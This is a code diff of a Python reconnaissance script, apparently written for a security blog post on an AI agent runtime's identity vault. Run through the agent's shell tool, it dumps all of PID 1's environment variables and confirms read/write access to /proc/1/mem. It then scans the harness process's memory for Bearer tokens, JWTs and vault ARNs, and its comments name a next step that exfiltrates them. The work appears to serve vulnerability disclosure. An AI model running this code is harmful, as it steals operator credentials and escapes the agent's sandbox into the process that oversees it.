@@ -1,19 +1,26 @@
 """Blog demo — detailed runtime recon for the identity vault blog post.
 
 Shows:
-  1. Process identity + capabilities (who are we, what can we do)
-  2. Full filesystem root (all entries, permissions, no truncation)
-  3. Token vault / Identity SDK paths in site-packages
-  4. Loopy + Strands source layout
-  5. /proc/1/environ — vault ARN references + AWS vars
+  1. Process identity (id, whoami, pid, capabilities)
+  2. Full filesystem root (ls -la /)
+  3. /etc probe (resolv.conf, hostname, os-release)
+  4. /opt/amazon layout + Identity SDK + loopy + strands
+  5. /proc/1/environ — ALL env vars
   6. /proc/1/mem access check (the primitive)
+  7. Heap anchor scan — what credential-shaped artifacts live in PID 1's memory
 
 No env vars needed. No exfil. Pure recon for blog screenshots.
-Designed to produce complete output — no truncation.
+Designed to produce complete, structured output — no truncation.
+
+Output is printed as sections delimited by:
+  ============================================================
+    TITLE
+  ============================================================
 
 Hosted at github.com/nivmorabin/skills/dict-walk/pid1_blog_recon.py
 """
 import os
+import re
 import subprocess
 import sys
 
@@ -37,85 +44,85 @@ def section(title):
 def main():
     # --- 1. Process identity ---
     section('1. PROCESS IDENTITY')
+    print('$ id')
     print(run('id'))
-    print(f'PID: {os.getpid()}')
+    print()
+    print('$ whoami')
+    print(run('whoami'))
+    print()
+    print(f'PID:  {os.getpid()}')
     print(f'PPID: {os.getppid()}')
-    print(f'UID: {os.getuid()}')
-    print(f'CWD: {os.getcwd()}')
+    print(f'UID:  {os.getuid()}')
+    print(f'CWD:  {os.getcwd()}')
 
-    # --- 2. Filesystem root (full, no truncation) ---
-    section('2. FILESYSTEM ROOT (ls -la /)')
+    # --- 2. Filesystem root ---
+    section('2. FILESYSTEM ROOT')
+    print('$ ls -la /')
     print(run('ls -la /'))
 
-    # --- 3. /opt/amazon layout ---
-    section('3. /opt/amazon LAYOUT')
+    # --- 3. /etc probe ---
+    section('3. /etc PROBE')
+    print('$ cat /etc/os-release')
+    print(run('cat /etc/os-release 2>/dev/null | head -5'))
+    print()
+    print('$ hostname')
+    print(run('hostname'))
+    print()
+    print('$ cat /etc/resolv.conf')
+    print(run('cat /etc/resolv.conf 2>/dev/null'))
+
+    # --- 4. Harness runtime layout ---
+    section('4. HARNESS RUNTIME (/opt/amazon)')
+    print('$ ls -la /opt/amazon/')
     print(run('ls -la /opt/amazon/'))
     print()
-    print('--- /opt/amazon/src/ ---')
-    print(run('ls -la /opt/amazon/src/ 2>/dev/null || echo "(not found)"'))
-    print()
-    print('--- /opt/amazon/lib/ (top-level) ---')
-    print(run('ls /opt/amazon/lib/ 2>/dev/null | head -30'))
-
-    # --- 4. Token vault / Identity SDK in site-packages ---
-    section('4. TOKEN VAULT / IDENTITY SDK')
+    print('--- Identity SDK files ---')
     pkg_dir = '/opt/amazon/lib/python3.10/site-packages'
-
-    print(f'--- Searching for Identity SDK in {pkg_dir} ---')
-    # Look for bedrock_agentcore identity module
     identity_paths = []
-    for root, dirs, files in os.walk(pkg_dir):
-        for f in files:
-            full = os.path.join(root, f)
-            rel = full[len(pkg_dir)+1:]
-            if 'identity' in rel.lower() and rel.endswith('.py'):
-                identity_paths.append(rel)
-            if 'credential' in rel.lower() and rel.endswith('.py'):
-                identity_paths.append(rel)
-            if 'token_vault' in rel.lower() or 'tokenvault' in rel.lower():
-                identity_paths.append(rel)
-    for p in sorted(set(identity_paths))[:30]:
-        print(f'  {p}')
-    if not identity_paths:
-        print('  (no identity/credential/token_vault .py files found)')
-
-    # --- 5. Loopy source layout ---
-    section('5. LOOPY SOURCE LAYOUT')
-    loopy_dir = os.path.join(pkg_dir, 'loopy')
-    if os.path.isdir(loopy_dir):
-        print(f'--- {loopy_dir}/ ---')
-        for root, dirs, files in os.walk(loopy_dir):
-            level = root[len(loopy_dir):].count(os.sep)
-            indent = '  ' * (level + 1)
-            print(f'{indent}{os.path.basename(root)}/')
-            sub_indent = '  ' * (level + 2)
-            for f in sorted(files)[:20]:
-                print(f'{sub_indent}{f}')
-            if len(files) > 20:
-                print(f'{sub_indent}... ({len(files)} total)')
-    else:
-        print(f'  loopy dir not found at {loopy_dir}')
-        # Try find
-        print(run(f'find {pkg_dir} -path "*/loopy*" -type f 2>/dev/null | head -20'))
-
-    # --- 6. Strands source layout ---
-    section('6. STRANDS-AGENTS SOURCE LAYOUT')
+    if os.path.isdir(pkg_dir):
+        for root, dirs, files in os.walk(pkg_dir):
+            for f in files:
+                full = os.path.join(root, f)
+                rel = full[len(pkg_dir)+1:]
+                if ('bedrock_agentcore/identity' in rel or
+                    'bedrock_agentcore/services/identity' in rel or
+                    rel.startswith('loopy/')):
+                    identity_paths.append(rel)
+        for p in sorted(set(identity_paths)):
+            print(f'  {p}')
+    print()
+    print('--- Strands agents ---')
     strands_dir = os.path.join(pkg_dir, 'strands')
     if os.path.isdir(strands_dir):
-        print(f'--- {strands_dir}/ (top-level modules) ---')
         for item in sorted(os.listdir(strands_dir)):
             full = os.path.join(strands_dir, item)
             if os.path.isdir(full):
-                sub_files = os.listdir(full)
-                print(f'  {item}/ ({len(sub_files)} files)')
+                print(f'  {item}/ ({len(os.listdir(full))} files)')
             else:
                 print(f'  {item}')
-    else:
-        print(f'  strands dir not found at {strands_dir}')
-        print(run(f'find {pkg_dir} -path "*/strands*" -type d 2>/dev/null | head -10'))
 
-    # --- 7. /proc/1/environ — vault ARN + AWS vars ---
-    section('7. /proc/1/environ (vault references + AWS vars)')
+    # --- 5. PID 1 identity ---
+    section('5. PID 1 (the harness process)')
+    print('$ cat /proc/1/cmdline')
+    try:
+        cmdline = open('/proc/1/cmdline', 'rb').read().replace(b'\x00', b' ').decode('utf-8', errors='replace').strip()
+        print(f'  {cmdline}')
+    except Exception as e:
+        print(f'  (error: {e})')
+    print()
+    print('$ cat /proc/1/status | grep ...')
+    try:
+        status = open('/proc/1/status').read()
+        for line in status.splitlines():
+            if line.startswith(('Name:', 'Uid:', 'Gid:', 'Seccomp:', 'NoNewPrivs:', 'TracerPid:', 'CapBnd:')):
+                print(f'  {line}')
+    except Exception as e:
+        print(f'  (error: {e})')
+
+    # --- 6. /proc/1/environ ---
+    section('6. /proc/1/environ (ALL environment variables)')
+    print("$ open('/proc/1/environ', 'rb').read().split(b'\\\\x00')")
+    print()
     try:
         raw_env = open('/proc/1/environ', 'rb').read()
         entries = raw_env.split(b'\x00')
@@ -124,100 +131,63 @@ def main():
             if b'=' in entry:
                 k, v = entry.split(b'=', 1)
                 all_vars[k.decode('utf-8', errors='replace')] = v.decode('utf-8', errors='replace')
-
-        # Show AWS/AGENTCORE vars
-        print('--- AWS / AGENTCORE vars ---')
         for k in sorted(all_vars):
-            if k.startswith(('AWS_', 'AGENTCORE_')):
-                print(f'  {k}={all_vars[k][:120]}')
-
-        # Show vault/credential/token references
-        print()
-        print('--- Vault / credential references ---')
-        vault_found = False
-        for k, v in sorted(all_vars.items()):
-            if any(x in v.lower() for x in ('credential', 'token-vault', 'apikey', 'vault')):
-                print(f'  {k}={v[:150]}')
-                vault_found = True
-            if any(x in k.lower() for x in ('credential', 'token', 'vault', 'secret')):
-                print(f'  {k}={v[:150]}')
-                vault_found = True
-        if not vault_found:
-            print('  (no vault/credential references in env — vault is resolved at invoke time)')
-            print('  The ${arn:...} reference is in harness CONFIG, not in runtime env.')
-            print('  After invoke, resolved bytes land in PID 1 HEAP (httpx buffers).')
-
-        # Show PYTHON vars
-        print()
-        print('--- PYTHON vars ---')
-        for k in sorted(all_vars):
-            if k.startswith('PYTHON'):
-                print(f'  {k}={all_vars[k][:120]}')
-
-    except Exception as e:
-        print(f'  ERROR reading /proc/1/environ: {e}')
-
-    # --- 8. /proc/1/mem access ---
-    section('8. /proc/1/mem ACCESS (the primitive)')
-    print(f'  os.access("/proc/1/mem", R_OK) = {os.access("/proc/1/mem", os.R_OK)}')
-    print(f'  os.access("/proc/1/mem", W_OK) = {os.access("/proc/1/mem", os.W_OK)}')
-    print()
-    # Show PID 1 status for context
-    try:
-        status = open('/proc/1/status').read()
-        print('  /proc/1/status (selected):')
-        for line in status.splitlines():
-            if line.startswith(('Name:', 'Uid:', 'Gid:', 'Seccomp:', 'NoNewPrivs:', 'TracerPid:')):
-                print(f'    {line}')
+            v = all_vars[k]
+            if len(v) > 120:
+                v = v[:120] + '...'
+            print(f'  {k}={v}')
+        print(f'\n  ({len(all_vars)} total environment variables)')
     except Exception as e:
         print(f'  ERROR: {e}')
 
-    # Yama check
+    # --- 7. /proc/1/mem access ---
+    section('7. /proc/1/mem ACCESS CHECK')
+    print("$ python3 -c \"import os; print(os.access('/proc/1/mem', os.R_OK | os.W_OK))\"")
+    print()
+    mem_r = os.access('/proc/1/mem', os.R_OK)
+    mem_w = os.access('/proc/1/mem', os.W_OK)
+    print(f'  /proc/1/mem readable: {mem_r}')
+    print(f'  /proc/1/mem writable: {mem_w}')
+    print()
     try:
         yama = open('/proc/sys/kernel/yama/ptrace_scope').read().strip()
-        print(f'\n  /proc/sys/kernel/yama/ptrace_scope = {yama}')
+        print(f'  Yama ptrace_scope: {yama}')
     except FileNotFoundError:
-        print(f'\n  /proc/sys/kernel/yama/ptrace_scope = NOT LOADED (permissive)')
-
+        print(f'  Yama ptrace_scope: NOT LOADED (kernel has no Yama module)')
     print()
-    print('  CONCLUSION: shell tool (uid=0) can open /proc/1/mem (uid=0)')
-    print('  for both reading and writing. No ptrace, no capabilities needed.')
+    if mem_r and mem_w:
+        print('  RESULT: The shell tool can read AND write PID 1\'s entire')
+        print('  address space. No ptrace needed, no capabilities needed.')
+        print('  Just open("/proc/1/mem", "r+b") and seek to any address.')
 
-    # --- 9. Heap anchor scan ---
-    section('9. WHAT LIVES IN PID 1 HEAP (anchor scan)')
-    print('  Scanning /proc/1/mem for structural anchors...')
-    print('  (This is what the exfil script will extract in the next cell.)')
+    # --- 8. Heap anchor scan ---
+    section('8. HEAP ANCHOR SCAN — what lives in PID 1\'s memory?')
+    print('  We can read /proc/1/mem. What credential-shaped artifacts')
+    print('  are sitting in the harness process\'s heap right now?')
     print()
 
     ANCHORS = [
-        # Harness configuration objects (Pydantic models in memory)
         (b'HarnessRemoteMcpConfig', 'MCP tool config (Pydantic model)'),
         (b'HarnessToolType', 'Tool type enum'),
         (b'HarnessHeaders', 'HTTP headers config'),
-        # MCP protocol traffic residue
         (b'"method":"initialize"', 'MCP initialize call'),
         (b'"method":"tools/list"', 'MCP tools/list call'),
         (b'"method":"tools/call"', 'MCP tools/call invocation'),
         (b'"protocolVersion":"2024-11-05"', 'MCP protocol version'),
-        # HTTP traffic residue
-        (b'Authorization: Bearer', 'Authorization header (credential!)'),
-        (b'authorization: Bearer', 'Authorization header (lowercase)'),
+        (b'Authorization: Bearer', 'Authorization header (CREDENTIAL)'),
+        (b'authorization: Bearer', 'authorization header (lowercase)'),
         (b'server: uvicorn', 'Uvicorn response header'),
         (b'HTTP/1.1 200 OK', 'HTTP response status'),
-        # Identity vault artifacts
         (b'credential-provider/', 'Credential provider ARN'),
         (b'token-vault/', 'Token vault ARN path'),
         (b'resolve_header_references', 'Loopy vault-resolution function'),
         (b'GetWorkloadAccessToken', 'Identity API call name'),
         (b'workloadIdentity', 'Workload identity reference'),
-        # JWT signatures (credential bytes)
-        (b'eyJraWQiOi', 'JWT with kid header (credential)'),
-        (b'eyJhbGciOi', 'JWT with alg header (credential)'),
-        # Runtime URL
+        (b'eyJraWQiOi', 'JWT with kid header (CREDENTIAL)'),
+        (b'eyJhbGciOi', 'JWT with alg header (CREDENTIAL)'),
         (b'bedrock-agentcore.us-east-1.amazonaws.com/runtimes/', 'AgentCore runtime URL'),
     ]
 
-    # Enumerate writable regions
     regions = []
     for line in open('/proc/1/maps').readlines():
         parts = line.split()
@@ -226,11 +196,10 @@ def main():
         perms = parts[1]
         if 'r' not in perms:
             continue
-        addr_range = parts[0]
         try:
-            start_s, end_s = addr_range.split('-')
+            start_s, end_s = parts[0].split('-')
             lo, hi = int(start_s, 16), int(end_s, 16)
-            if hi - lo >= 4096 and hi - lo <= 50 * 1024 * 1024:
+            if 4096 <= hi - lo <= 50 * 1024 * 1024:
                 regions.append((lo, hi))
         except Exception:
             continue
@@ -248,25 +217,26 @@ def main():
                 if count > 0:
                     found_anchors[label] = found_anchors.get(label, 0) + count
 
-    print(f'  {"ANCHOR":<45s} {"HITS":>5s}')
+    print(f'  {"ARTIFACT":<45s} {"HITS":>5s}')
     print(f'  {"-"*45} {"-----":>5s}')
     for needle, label in ANCHORS:
         count = found_anchors.get(label, 0)
-        marker = '  <<<' if count > 0 and 'credential' in label.lower() else ''
         if count > 0:
+            marker = '  <<<' if 'CREDENTIAL' in label else ''
             print(f'  {label:<45s} {count:>5d}{marker}')
 
-    total_credential_hits = sum(
+    cred_hits = sum(
         found_anchors.get(label, 0)
         for _, label in ANCHORS
-        if 'credential' in label.lower() or 'JWT' in label or 'Bearer' in label
+        if 'CREDENTIAL' in label
     )
     print()
-    if total_credential_hits > 0:
-        print(f'  >>> {total_credential_hits} credential-shaped artifacts in PID 1 heap.')
-        print('  >>> These are the vault-resolved tokens the next cell exfiltrates.')
+    if cred_hits > 0:
+        print(f'  >>> {cred_hits} credential-shaped artifacts found in PID 1 heap.')
+        print('  >>> The vault-resolved Bearer token is sitting in memory,')
+        print('  >>> readable by any code the shell tool executes.')
     else:
-        print('  (No credential artifacts found — run Cell 2 first to trigger')
+        print('  (No credential artifacts yet — run Cell 2 first to trigger')
         print('   a legitimate MCP call that resolves the vault credential.)')
 
     section('DONE')
